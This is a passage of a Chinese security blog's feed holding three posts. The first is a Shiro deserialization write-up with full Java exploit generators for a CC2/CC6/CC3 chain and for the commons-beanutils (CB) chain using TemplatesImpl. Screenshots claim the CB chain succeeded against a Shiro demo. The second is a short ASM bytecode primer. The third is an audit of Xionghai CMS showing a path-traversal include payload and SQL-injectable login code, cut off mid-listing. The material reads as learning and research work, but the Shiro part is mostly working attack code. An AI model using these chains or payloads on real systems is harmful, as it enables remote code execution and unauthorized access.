&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后将生成的ser.bin文件进行aes加密后再base64进行传参</p><blockquote><p>这里我一开始试了一下用cyberchef来加密发现不行，还是得用上面的脚本</p></blockquote><p>先看一下正常的：</p><p><img src="http://cdn.clown2024.cn/202407151444243.png" alt="image-20240614215924819"></p><p>打了cc6的：</p><p><img src="http://cdn.clown2024.cn/202407151444244.png" alt="image-20240614220816682"></p><p>这里就是没登录上去是正常的，后端开启debug去看一下，这时候应该是有报错的</p><p><img src="http://cdn.clown2024.cn/202407151444245.png" alt="image-20240614232811726"></p><p>这里是反序列化抛了异常，说是无法加载invokerTransformer，就是由于shiro无法处理数组导致的，后面再说，比较复杂</p><blockquote><p>但是这里报错的又不太对啊，他是cc的全部类都无法加载，太怪了</p></blockquote><p>所以这里我们就需要改一下链子，改成不用chainedTransformer数组的形式，也就是拼一下链子就好，然后最后要改成<strong>动态类加载执行任意代码的方式</strong></p><p>这里使用<strong>cc2+cc6+cc3</strong>的方式进行拼接</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//这里先随便赋一个值后面改回来</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//这里要添加进去templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//这里改回来chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//移除掉我们新增的键值</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>服了这里也没打通，后台直接报错TiedMapEntry都无法加载</p><p>后来我用了p神的环境就能打通了，估计还是cc依赖运行时没有被编译进去</p><p>这是p神的环境：<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p><img src="http://cdn.clown2024.cn/202407151444246.png" alt="image-20240615104853896"></p><blockquote><p>打的时候要去掉<strong>JSESSIONID</strong></p></blockquote><h2><span id="打cb链">打CB链</span></h2><p>CB链打的是shiro自带的依赖：commons-beanutils（就是对javabean的增强类），这里注意一下版本是1.8.3的，本地写exp的时候记得版本也要一致，不然会打不通</p><p>下面是一个简单的javaBean的例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以不需要再去调用get方法来获取属性值，而是直接用PropertyUtils的静态方法来获取</p><p>然后在这处理的过程中就存在反序列化的点，就直接说了反序列化的点就是会调用javaBean的get方法，比如上面的age就会调用<strong>getAge</strong>方法</p><p>我们可以调试跟进去看一下我们传入了name为”age”之后发生了什么</p><p>一路跟进下去，会在一个getSimpleProperty的方法里面获取到javaBean的各种方法，然后会把我们传进去的名字从小写改成大写</p><blockquote><p>而且我们这里不传大写的属性名进去，不然会报错</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444247.png" alt="image-20240615093151593"></p><p>再往下两行，他就获取了读取属性的get方法，然后进行函数调用，获取了age的值</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093518572.png" alt="image-20240615093518572"></p><p>我们传进去的javaBean最终就会变成我们指定的属性的值然后返回</p><p><img src="http://cdn.clown2024.cn/202407151444248.png" alt="image-20240615093640915"></p><p><img src="http://cdn.clown2024.cn/202407151444249.png" alt="image-20240615093725798"></p><p>这里其中存在的利用点就是这个get方法的调用</p><h3><span id="templatesimpl">TemplatesImpl</span></h3><p>这里就跟我们动态类加载任意代码的这个类有关</p><p>它里面有一个<strong>getOutputProperties()<strong>的方法，这个方法的就很符合javaBean的方式，最重要的是它里面还调用了</strong>newTransformer</strong>这个方法</p><p><img src="http://cdn.clown2024.cn/202407151444250.png" alt="image-20240615094412956"></p><p>所以我们只需要传一个<strong>outputProperties</strong>的名字进去就可以调用这个方法，记得这里一定要是<strong>小写</strong>的形式</p><h3><span id="beancomparator">BeanComparator</span></h3><p>接下来就是从<strong>ProperUtils</strong>往上找看谁调用了他的<strong>getProperty</strong>方法</p><p>这里就找到BeanComparator的compare方法</p><p><img src="http://cdn.clown2024.cn/202407151444251.png" alt="image-20240615094845997"></p><p>看一下他的构造方法</p><p><img src="http://cdn.clown2024.cn/202407151444252.png" alt="image-20240615095155801"></p><p>这里也提前说一下，我们需要调用下面的构造方法，而不能调用上面的，因为上面的ComparableComparator是属于Commoms-Collections里面的方法，而shiro自带是没有这个的，我们打了就会报错</p><p>所以这里comparator我们就需要赋值一个java本身就有的而且是继承了序列化接口的类，这里直接用组长视频里面用的那个<strong>AttrCompare</strong>类</p><h3><span id="priorityqueue">PriorityQueue</span></h3><p>见到这个compare就很熟悉了，我们的cc2和cc4里面就是利用了PriorityQueue的readObject方法，然后里面调用compare方法的，那链子就基本串起来了</p><p>现在可以来写一个exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br>        <span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//先传一个没用东西阻断链子执行</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        <span class="hljs-comment">//这里的size要满足要求才能触发调用链执行，这里需要改用添加元素才行，因为我们的templates还没有加入进去</span><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">//然后反射修改回来priorityQueue的值</span><br>        Class p=PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> p.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,beanComparator);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用了比较懒的改法，直接借用了一下cc4这个类，主要是为了序列化能成功，本地测试无所谓，其他改法调了半天都报错懒得调了。。。</p><p><img src="http://cdn.clown2024.cn/202407151444253.png" alt="image-20240615103205401"></p><p><strong>打一下shiro看看效果</strong></p><p><img src="http://cdn.clown2024.cn/202407151444254.png" alt="image-20240615103608867"></p><p>可以成功打通</p><blockquote><p>注意这里如果用ysoserial生成的payload打是打不通的，因为他的CB版本和shiro的不一样</p><p>这里用的官方环境没有删掉<strong>JSESSIONID</strong>竟然也通了（</p></blockquote><h3><span id="cb链调用图">CB链调用图</span></h3><p><img src="http://cdn.clown2024.cn/202407151444255.png" alt="image-20240615001956606"></p><h1><span id="shiro721">Shiro721</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;shiro介绍&quot;&gt;Shiro介绍&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;直接问kimi给出的大致介绍&lt;/p&gt;
&lt;p&gt;Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强</summary>
      
    
    
    
    <category term="java漏洞" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java反序列化" scheme="https://clowsman.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ASM学习</title>
    <link href="https://clowsman.github.io/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-06-10T13:39:52.000Z</published>
    <updated>2024-06-15T16:29:39.540Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下java的ASM，和class字节码以及一些简单的jvm知识也记录在这，参考文章：<a href="https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.javabetter.cn/jvm/class-file-jiegou.html">https://lsieun.github.io/java/asm/java-asm-season-01.html，https://www.javabetter.cn/jvm/class-file-jiegou.html</a></p><p>因为后面java反序列化的学习还需要动态生成恶意字节码，所以来补补基础。</p><h1><span id="java类文件结构">Java类文件结构</span></h1><h1><span id="asm介绍">ASM介绍</span></h1><p>ASM就是一个操作java字节码的类库。</p><p>ASM的操作对象字节码数据，就是.java文件经过javac之后生成的.class文件。</p><p>ASM处理字节码的步骤就是：拆分-&gt;修改-&gt;合并</p><ul><li>第一步，将 <code>.class</code> 文件拆分成多个部分；</li><li>第二步，对某一个部分的信息进行修改；</li><li>第三步，将多个部分重新组织成一个新的 <code>.class</code> 文件。</li></ul><h2><span id="版本问题">版本问题</span></h2><p>不同的ASM版本对应不同的Java版本，高版本可以兼容低版本</p><table><thead><tr><th>ASM Release</th><th>Release Date</th><th>Java Support</th></tr></thead><tbody><tr><td>2.0</td><td>2005-05-17</td><td>Java 5 language support</td></tr><tr><td>3.2</td><td>2009-06-11</td><td>support for the new <code>invokedynamic</code> code.</td></tr><tr><td>4.0</td><td>2011-10-29</td><td>Java 7 language support</td></tr><tr><td>5.0</td><td>2014-03-16</td><td><strong>Java 8 language support</strong></td></tr><tr><td>6.0</td><td>2017-09-23</td><td>Java 9 language support</td></tr><tr><td>6.1</td><td>2018-03-11</td><td>Java 10 language support</td></tr><tr><td>7.0</td><td>2018-10-27</td><td><strong>Java 11 language support</strong></td></tr><tr><td>7.1</td><td>2019-03-03</td><td>Java 13 language support</td></tr><tr><td>8.0</td><td>2020-03-28</td><td>Java 14 language support</td></tr><tr><td>9.0</td><td>2020-09-22</td><td>Java 16 language support</td></tr><tr><td>9.1</td><td>2021-02-06</td><td><strong>JDK 17 support</strong></td></tr><tr><td>9.2</td><td>2021-06-26</td><td>JDK 18 support</td></tr><tr><td>9.3</td><td>2022-04-04</td><td></td></tr><tr><td>9.4</td><td>2022-10-02</td><td></td></tr><tr><td>9.5</td><td>2023-03-24</td><td></td></tr></tbody></table><h2><span id="asm能做的事">ASM能做的事</span></h2><ul><li>父类：修改成一个新的父类</li><li>接口：添加一个新的接口、删除已有的接口</li><li>字段：添加一个新的字段、删除已有的字段</li><li>方法：添加一个新的方法、删除已有的方法、修改已有的方法</li><li>…等等</li></ul><h1><span id="asm生成新的类">ASM生成新的类</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学习一下java的ASM，和class字节码以及一些简单的jvm知识也记录在这，参考文章：&lt;a href=&quot;https://lsieun.github.io/java/asm/java-asm-season-01.html%EF%BC%8Chttps://www.java</summary>
      
    
    
    
    <category term="java基础" scheme="https://clowsman.github.io/categories/java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>熊海cms代码审计</title>
    <link href="https://clowsman.github.io/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://clowsman.github.io/2024/05/21/%E7%86%8A%E6%B5%B7cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-05-20T16:11:05.000Z</published>
    <updated>2024-07-15T09:12:47.247Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="环境安装">环境安装</span></h1><p>来审一下这个简单cms学习一下，熊海cms直接网上找就可以</p><p>采用phpstudy进行配置，然后要提前建立一个数据，他不会自动帮你建</p><p>安装好后首页就是这样的</p><p><img src="http://cdn.clown2024.cn/202407151712203.png" alt="image-20240521001351083"></p><h1><span id="开始审计">开始审计</span></h1><h2><span id="目录结构">目录结构</span></h2><p><img src="http://cdn.clown2024.cn/202407151712204.png" alt="image-20240523235111948"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">admin         --管理后台文件夹<br>css           --存放css的文件夹<br>files         --存放页面的文件夹<br>images        --存放图片的文件夹<br>inc           --存放网站配置文件的文件夹<br>install       --网站进行安装的文件夹<br>seacmseditor  --编辑器文件夹<br>template      --模板文件夹<br>upload        --上传功能文件夹<br>index.php     --网站首页<br></code></pre></td></tr></table></figure><p>先直接放进seay里面扫一下</p><p><img src="http://cdn.clown2024.cn/202407151712205.png" alt="image-20240523235351518"></p><p>看起来还蛮少的，那就直接针对每个漏洞类型去看看</p><h2><span id="文件包含漏洞">文件包含漏洞</span></h2><p><strong>第一处文件包含</strong></p><p>根目录下的index.php源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显的文件包含，存在目录穿越漏洞，我在网站上级目录放了flag.php用来测试，r为空就会包含files目录下的index，给r传一个..&#x2F;..&#x2F;flag即可目录穿越</p><p><img src="http://cdn.clown2024.cn/202407151712206.png" alt="image-20240524000419879"></p><p>能配合文件上传就能够发挥大用处，目前暂时读读文件只能</p><p>addslashes是用来转义一些特殊字符的</p><p><img src="http://cdn.clown2024.cn/202407151712207.png" alt="image-20240524000753569"></p><p><strong>第二处文件包含</strong></p><p>第二处在&#x2F;admin&#x2F;index.php处</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>该页面默认会加上login参数</p><p><img src="http://cdn.clown2024.cn/202407151712208.png" alt="image-20240524001055974"></p><p>一样的目录穿越漏洞</p><p><img src="http://cdn.clown2024.cn/202407151712209.png" alt="image-20240524001024759"></p><h2><span id="sql注入">SQL注入</span></h2><p>admin&#x2F;files下面的页面就报了很多sql的漏洞</p><p>但是我想先去看一下login页面，因为很多漏洞都是后台页面，登陆都绕过不过去怎么进后台利用呢，而且这个cms应该没有预编译习惯，login页面的sql应该也是有漏洞，我就去看了一下，还真有</p><p><strong>admin&#x2F;files&#x2F;login.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../inc/conn.php&#x27;</span>;<br><span class="hljs-variable">$login</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>];<br><span class="hljs-variable">$user</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-variable">$checkbox</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;checkbox&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$login</span>&lt;&gt;<span class="hljs-string">&quot;&quot;</span>)&#123;<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="hljs-subst">$user</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL语句有误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br><span class="hljs-variable">$users</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>)) &#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$passwords</span>=<span class="hljs-variable">$users</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)&lt;&gt;<span class="hljs-variable">$passwords</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;抱歉，用户名或者密码错误。&#x27;);history.back();&lt;/Script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment">//写入登录信息并记住30天</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$checkbox</span>==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;user&#x27;</span>,<span class="hljs-variable">$user</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;this.location=&#x27;?r=index&#x27;&lt;/script&gt;&quot;</span>;<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">exit</span>;<br><span class="hljs-title function_ 